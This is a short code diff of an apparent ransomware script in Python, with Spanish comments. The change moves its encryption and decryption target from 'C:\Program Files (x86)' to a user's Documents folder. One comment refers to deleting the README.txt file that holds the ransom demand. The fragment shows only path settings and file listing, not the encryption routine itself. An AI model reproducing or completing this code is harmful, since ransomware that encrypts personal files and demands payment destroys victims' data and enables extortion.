@@ -44,7 +44,7 @@ if __name__ == '__main__':
 
     try:
         # Directorio que vamos a cifrar.
-        path_to_encrypt = 'C:\\Program Files (x86)'
+        path_to_encrypt = 'C:\\Users\\aaron\\Documents'
 
         # Obtenemos los archivos del directorio a cifrar  los guardamos en una lista.
         items = os.listdir(path_to_encrypt)
@@ -112,7 +112,7 @@ if __name__ == '__main__':
     try:
 
         # Directorio que vamos a cifrar.
-        path_to_decrypt = 'C:\\Program Files (x86)'
+        path_to_decrypt = 'C:\\Users\\aaron\\Documents'
 
         # Eliminamos el archivo típico con el mensaje solicitando el rescate.
         os.remove(path_to_decrypt + '\\README.txt')
